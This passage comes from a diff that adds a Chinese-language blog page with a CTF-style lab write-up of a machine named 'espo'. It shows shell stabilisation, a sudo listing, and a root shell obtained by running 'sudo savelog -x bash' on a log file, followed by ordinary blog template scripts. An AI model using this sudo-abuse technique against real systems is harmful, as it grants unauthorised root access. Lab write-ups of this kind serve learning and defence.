+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<p>尝试提权</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mandie@espo:<span class="pl-k">~</span>$ sudo -l
+sudo: unable to resolve host espo: Name or service not known
+Matching Defaults entries <span class="pl-k">for</span> mandie on espo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, use_pty
+
+User mandie may run the following commands on espo:
+    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/bin/savelog
+mandie@espo:<span class="pl-k">~</span>$ /usr/bin/savelog -h
+Usage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]
+             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...
+        -m mode    - chmod log files to mode
+        -u user    - chown log files to user
+        -g group   - chgrp log files to group
+        -c cycle   - save cycle versions of the logfile (default: 7)
+        -r rolldir - use rolldir instead of <span class="pl-c1">.</span> to roll files
+        -C         - force cleanup of cycled logfiles
+        -d         - use standard date <span class="pl-k">for</span> rolling
+        -D         - override date format <span class="pl-k">for</span> -d
+        -t         - touch file
+        -l         - don<span class="pl-s"><span class="pl-pds">'</span>t compress any log files (default: compress)</span>
+<span class="pl-s">        -p         - preserve mode/user/group of original file</span>
+<span class="pl-s">        -j         - use bzip2 instead of gzip</span>
+<span class="pl-s">        -J         - use xz instead of gzip</span>
+<span class="pl-s">        -1 .. -9   - compression strength or memory usage (default: 9, except for xz)</span>
+<span class="pl-s">        -x script  - invoke script with rotated log file in $FILE</span>
+<span class="pl-s">        -n         - do not rotate empty files</span>
+<span class="pl-s">        -q         - suppress rotation message</span>
+<span class="pl-s">        file       - log file names</span>
+<span class="pl-s"></span>
+<span class="pl-s"># 翻译</span>
+<span class="pl-s">用法： savelog [-m 模式] [-u 用户] [-g 组] [-t] [-c 循环] [-p]</span>
+<span class="pl-s">             [-j][-C][-d][-l][-r 滚动目录][-n][-q] 文件 ...</span>
+<span class="pl-s">        -m mode - chmod 日志文件模式</span>
+<span class="pl-s">        -u 用户 - 将日志文件上传到用户</span>
+<span class="pl-s">        -g group - 要分组的 chgrp 日志文件</span>
+<span class="pl-s">        -c cycle - 保存日志文件的循环版本（默认值：7）</span>
+<span class="pl-s">        -r rolldir - 使用 rolldir 而不是 .滚动文件</span>
+<span class="pl-s">        -C - 强制清理循环的日志文件</span>
+<span class="pl-s">        -d - 使用标准日期进行滚动</span>
+<span class="pl-s">        -D - 覆盖 -d 的日期格式</span>
+<span class="pl-s">        -t - 触摸文件</span>
+<span class="pl-s">        -l - 不压缩任何日志文件（默认：compress）</span>
+<span class="pl-s">        -p - 保留原始文件的模式/用户/组</span>
+<span class="pl-s">        -j - 使用 bzip2 而不是 gzip</span>
+<span class="pl-s">        -J - 使用 xz 而不是 gzip</span>
+<span class="pl-s">        -1 ..-9 - 压缩强度或内存使用率（默认值：9，xz 除外）</span>
+<span class="pl-s">        -x script - 使用$FILE中旋转的日志文件调用脚本</span>
+<span class="pl-s">        -n - 不旋转空文件</span>
+<span class="pl-s">        -q - 禁止旋转消息</span>
+<span class="pl-s">        file - 日志文件名</span>
+<span class="pl-s"></span></pre></div>
+<p><code class="notranslate">-x</code>我们比较感兴趣，试试行不行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mandie@espo:<span class="pl-k">~</span>$ find / -name <span class="pl-s"><span class="pl-pds">"</span>*.log<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null
+/var/www/html/data/logs/espo-2023-12-04.log
+/var/www/html/data/logs/espo-2025-01-08.log
+/var/www/html/data/logs/espo-2024-01-24.log
+/var/log/alternatives.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/dpkg.log
+/var/log/php8.2-fpm.log
+/var/lib/mysql/ddl_recovery-backup.log
+/var/lib/mysql/ddl_recovery.log
+mandie@espo:<span class="pl-k">~</span>$ sudo /usr/bin/savelog -x bash /var/log/nginx/access.log
+sudo: unable to resolve host espo: Name or service not known
+root@espo:/home/mandie# id
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<p>成功提权</p>
+<h1>5.后话</h1>
+<p>看了一下<code class="notranslate">HGBE</code>大佬的wp，才发现群主<code class="notranslate">ll104567</code>发现了一个定时任务直接获取 root</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d"><img src="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d" alt="image" style="max-width: 100%;"></a></p>
+<p>甚至在<code class="notranslate">www-data</code>权限的时候就可以直接提权到<code class="notranslate">root</code><br>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95"><img src="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95" alt="C4" style="max-width: 100%;"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
